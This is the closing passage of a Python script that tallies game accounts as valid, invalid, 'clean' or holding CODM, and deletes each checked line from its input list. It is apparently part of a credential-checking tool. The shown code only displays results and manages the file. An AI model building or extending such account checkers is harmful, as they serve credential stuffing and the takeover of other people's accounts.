                f"Not Clean: [yellow]{stats['not_clean']}[/yellow] | "
                f"Has CODM: [cyan]{stats['has_codm']}[/cyan] | "
                f"No CODM: [magenta]{stats['no_codm']}[/magenta]",
                style="cyan",
                title="Live Statistics"
            )
            console.print(live_panel)

            # Auto-remove checked accounts
            if AUTO_REMOVE_CHECKED:
                try:
                    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                        remain = [ln for ln in f if ln.strip() != account_line.strip()]
                    with open(filename, "w", encoding="utf-8") as f:
                        for r in remain:
                            f.write(r if r.endswith("\n") else r + "\n")
                except Exception as e:
                    logger.error(f"Auto-remove failed: {e}")

        except Exception as e:
            console.print(f"[red][ERROR][/red] Failed to process {account}: {e}")
            continue

    # -------------------------------------------
    # DISPLAY FINAL RESULTS
    # -------------------------------------------
    final_stats = live_stats.get_stats()
    console.print(Panel(
        f"Valid: [green]{final_stats['valid']}[/green]\n"
        f"Invalid: [red]{final_stats['invalid']}[/red]\n"
        f"Clean: [blue]{final_stats['clean']}[/blue]\n"
        f"Not Clean: [yellow]{final_stats['not_clean']}[/yellow]\n"
        f"Has CODM: [cyan]{final_stats['has_codm']}[/cyan]\n"
        f"No CODM: [magenta]{final_stats['no_codm']}[/magenta]",
        style="bold green",
        title="Final Results ───────────────[ꜱɴᴘ⛧ ᐯɪɴᴄᴇɴᴛ]",
        box=DOUBLE
    ))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[!] Script terminated by user.", style="red")
    except Exception as e:
        console.print(f"[!] Unexpected error: {e}", style="red")